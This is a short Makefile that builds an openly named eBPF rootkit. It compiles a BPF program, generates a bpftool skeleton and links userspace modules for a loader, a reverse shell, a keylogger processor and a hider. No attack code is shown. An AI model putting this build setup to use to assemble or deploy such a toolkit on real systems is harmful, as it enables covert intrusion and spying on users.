CLANG   ?= clang
CC      ?= gcc
BPFTOOL ?= bpftool

BUILD_DIR := build

BPF_SRC := src/bpf/rootkit.c
BPF_OBJ := $(BUILD_DIR)/rootkit.o
SKEL    := include/rootkit.skel.h

USER_SRCS := \
	src/userspace/main.c \
	src/userspace/rootkit_loader.c \
	src/userspace/reverse_shell.c \
	src/userspace/keylogger_processor.c \
	src/userspace/hider.c

USER_BIN := $(BUILD_DIR)/rootkit

CFLAGS := -O2 -Wall -Wextra -Iinclude

BPF_CFLAGS := \
	-g \
	-O2 \
	-target bpf \
	-D__TARGET_ARCH_x86 \
	-Iinclude

LDFLAGS := -lbpf -lelf -lz

.PHONY: all clean

all: $(USER_BIN)

$(BUILD_DIR):
	mkdir -p $(BUILD_DIR)

$(BPF_OBJ): $(BPF_SRC) | $(BUILD_DIR)
	$(CLANG) \
		$(BPF_CFLAGS) \
		-c $< \
		-o $@

$(SKEL): $(BPF_OBJ)
	$(BPFTOOL) gen skeleton $< > $@

$(USER_BIN): $(USER_SRCS) $(SKEL) | $(BUILD_DIR)
	$(CC) \
		$(CFLAGS) \
		$(USER_SRCS) \
		$(LDFLAGS) \
		-o $@

clean:
	rm -rf $(BUILD_DIR)
	rm -f $(SKEL)
